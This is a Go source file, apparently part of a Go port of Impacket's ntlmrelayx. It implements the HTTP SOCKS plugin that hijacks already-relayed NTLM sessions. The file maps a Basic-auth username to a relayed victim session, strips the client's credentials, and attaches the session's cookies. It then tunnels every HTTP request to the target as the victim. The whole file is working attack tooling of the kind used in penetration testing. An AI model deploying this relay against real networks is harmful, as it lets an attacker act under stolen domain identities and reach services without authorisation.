package relay

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"

	"gopacket/internal/build"
)

// HTTPSocksPlugin implements the SOCKS plugin for HTTP/HTTPS protocol.
// Uses HTTP Basic authentication for username matching (not NTLM).
// Matches Impacket's socksplugins/http.py.
type HTTPSocksPlugin struct{}

func (p *HTTPSocksPlugin) InitConnection(clientConn net.Conn) error {
	return nil
}

func (p *HTTPSocksPlugin) SkipAuthentication(clientConn net.Conn, sd *SessionData, lookupRelay func(string) *ActiveRelay) (string, error) {
	// Read the first HTTP request from the SOCKS client
	reader := bufio.NewReader(clientConn)
	req, err := http.ReadRequest(reader)
	if err != nil {
		return "", fmt.Errorf("read HTTP request: %v", err)
	}

	// Check for Authorization: Basic header
	authHeader := req.Header.Get("Authorization")
	if !strings.HasPrefix(authHeader, "Basic ") {
		// Send 401 asking for Basic credentials
		resp := "HTTP/1.1 401 Unauthorized\r\n" +
			"WWW-Authenticate: Basic realm=\"ntlmrelayx - provide a DOMAIN/username\"\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		clientConn.Write([]byte(resp))
		return "", fmt.Errorf("no Basic auth provided")
	}

	// Decode Basic auth credentials
	decoded, err := base64.StdEncoding.DecodeString(authHeader[6:])
	if err != nil {
		return "", fmt.Errorf("decode Basic auth: %v", err)
	}

	parts := strings.SplitN(string(decoded), ":", 2)
	if len(parts) < 1 || parts[0] == "" {
		return "", fmt.Errorf("invalid Basic auth credentials")
	}

	rawUsername := parts[0]

	// Handle user@domain.com format → DOMAIN\user
	var username string
	if idx := strings.Index(rawUsername, "@"); idx > 0 {
		user := rawUsername[:idx]
		domain := rawUsername[idx+1:]
		if dot := strings.Index(domain, "."); dot > 0 {
			domain = domain[:dot]
		}
		username = fmt.Sprintf("%s\\%s", strings.ToUpper(domain), strings.ToUpper(user))
	} else if strings.Contains(rawUsername, "/") {
		// DOMAIN/user format → DOMAIN\user
		username = strings.ToUpper(strings.Replace(rawUsername, "/", "\\", 1))
	} else if strings.Contains(rawUsername, "\\") {
		username = strings.ToUpper(rawUsername)
	} else {
		// Plain username — no domain
		username = strings.ToUpper(rawUsername)
	}

	if build.Debug {
		log.Printf("[D] SOCKS HTTP: Basic auth for %s", username)
	}

	// Look up relay for this username
	relay := lookupRelay(username)
	if relay == nil {
		resp := "HTTP/1.1 401 Unauthorized\r\n" +
			"WWW-Authenticate: Basic realm=\"ntlmrelayx - provide a DOMAIN/username\"\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		clientConn.Write([]byte(resp))
		return "", fmt.Errorf("no relay found for user %s", username)
	}

	// Check if relay is already in use
	relay.mu.Lock()
	if relay.InUse {
		relay.mu.Unlock()
		resp := "HTTP/1.1 503 Service Unavailable\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		clientConn.Write([]byte(resp))
		return "", fmt.Errorf("relay for %s is already in use", username)
	}
	relay.mu.Unlock()

	// Get the underlying connection from the HTTP relay client
	httpClient, ok := relay.Client.(*HTTPRelayClient)
	if !ok {
		return "", fmt.Errorf("relay client is not HTTPRelayClient")
	}

	// Forward the initial request to the target (strip Authorization header)
	// Prepare the request: strip auth header, fix Connection
	req.Header.Del("Authorization")
	if req.Header.Get("Connection") == "close" {
		req.Header.Set("Connection", "Keep-Alive")
	}

	// Build the request for forwarding
	url := httpClient.baseURL() + req.URL.Path
	if req.URL.RawQuery != "" {
		url += "?" + req.URL.RawQuery
	}
	fwdReq, err := http.NewRequest(req.Method, url, req.Body)
	if err != nil {
		return "", fmt.Errorf("create forward request: %v", err)
	}
	fwdReq.Header = req.Header
	for _, cookie := range httpClient.cookies {
		fwdReq.AddCookie(cookie)
	}

	resp, err := httpClient.httpClient.Do(fwdReq)
	if err != nil {
		return "", fmt.Errorf("forward initial request: %v", err)
	}

	// Send the response back to the SOCKS client
	if err := writeHTTPResponse(clientConn, resp); err != nil {
		return "", fmt.Errorf("write initial response: %v", err)
	}

	log.Printf("[+] SOCKS HTTP: authenticated %s — routing through relay", username)

	return username, nil
}

func (p *HTTPSocksPlugin) TunnelConnection(clientConn net.Conn, relay *ActiveRelay) error {
	httpClient, ok := relay.Client.(*HTTPRelayClient)
	if !ok {
		return fmt.Errorf("relay client is not HTTPRelayClient")
	}

	reader := bufio.NewReader(clientConn)

	for {
		// Read next HTTP request from SOCKS client
		req, err := http.ReadRequest(reader)
		if err != nil {
			return fmt.Errorf("read request: %v", err)
		}

		// Strip Authorization header, fix Connection
		req.Header.Del("Authorization")
		if req.Header.Get("Connection") == "close" {
			req.Header.Set("Connection", "Keep-Alive")
		}

		// Forward to target
		url := httpClient.baseURL() + req.URL.Path
		if req.URL.RawQuery != "" {
			url += "?" + req.URL.RawQuery
		}

		fwdReq, err := http.NewRequest(req.Method, url, req.Body)
		if err != nil {
			return fmt.Errorf("create forward request: %v", err)
		}
		fwdReq.Header = req.Header
		for _, cookie := range httpClient.cookies {
			fwdReq.AddCookie(cookie)
		}

		resp, err := httpClient.httpClient.Do(fwdReq)
		if err != nil {
			return fmt.Errorf("forward request: %v", err)
		}

		// Send response back to client
		if err := writeHTTPResponse(clientConn, resp); err != nil {
			return fmt.Errorf("write response: %v", err)
		}
	}
}

// writeHTTPResponse writes an HTTP response to a connection, handling
// Content-Length and Transfer-Encoding: chunked.
func writeHTTPResponse(conn net.Conn, resp *http.Response) error {
	defer resp.Body.Close()

	// Write status line
	statusLine := fmt.Sprintf("HTTP/%d.%d %d %s\r\n", resp.ProtoMajor, resp.ProtoMinor, resp.StatusCode, resp.Status[4:])
	if _, err := conn.Write([]byte(statusLine)); err != nil {
		return err
	}

	// Write headers
	for key, values := range resp.Header {
		for _, v := range values {
			if _, err := conn.Write([]byte(fmt.Sprintf("%s: %s\r\n", key, v))); err != nil {
				return err
			}
		}
	}
	if _, err := conn.Write([]byte("\r\n")); err != nil {
		return err
	}

	// Write body
	if resp.ContentLength > 0 {
		if _, err := io.CopyN(conn, resp.Body, resp.ContentLength); err != nil {
			return err
		}
	} else if resp.TransferEncoding != nil && len(resp.TransferEncoding) > 0 && resp.TransferEncoding[0] == "chunked" {
		// Chunked transfer encoding
		buf := make([]byte, 8192)
		for {
			n, err := resp.Body.Read(buf)
			if n > 0 {
				chunk := fmt.Sprintf("%x\r\n", n)
				conn.Write([]byte(chunk))
				conn.Write(buf[:n])
				conn.Write([]byte("\r\n"))
			}
			if err != nil {
				break
			}
		}
		conn.Write([]byte("0\r\n\r\n"))
	} else if resp.ContentLength == -1 {
		// Unknown length — read until EOF
		io.Copy(conn, resp.Body)
	}

	return nil
}

